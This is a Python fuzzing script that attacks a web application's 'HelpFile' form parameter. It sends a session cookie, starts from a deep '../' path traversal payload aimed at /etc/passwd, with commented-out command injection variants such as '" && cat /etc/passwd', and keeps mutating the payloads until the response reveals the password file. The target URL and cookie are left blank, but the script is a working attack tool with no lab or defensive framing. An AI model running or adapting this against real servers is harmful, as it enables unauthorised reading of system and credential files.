import hairball
import mutator

import time
import statistics
import random

import requests

def test(payload):
    data = {
        'SUBMIT': 'View',
        'HelpFile': payload
    }
    r = requests.post('', data=data, cookies={'JSESSIONID':''})

    if r.text.find("root") > -1:
        print( r.text )
        return True
    return False


#baseline = b'" && cat /etc/passwd'
#baseline = b'BasicAuthentication.html"%20/etc/passwd"'
baseline = b'../../../../../../../../../../../../../../../../../../../../../../etc/passwd'

children = mutator.get_samples( baseline, num=10)

running = True
while(running):
    for c in range(0, len(children)):
        print(c, children[c])
        if test( children[c] ):
            print("SUCESS", children[c])
            running = False
        else:
            if random.randint(0,10) == 7:
                children[c] = mutator.mutate( baseline )
            else:
                children[c] = mutator.mutate( children[c] )
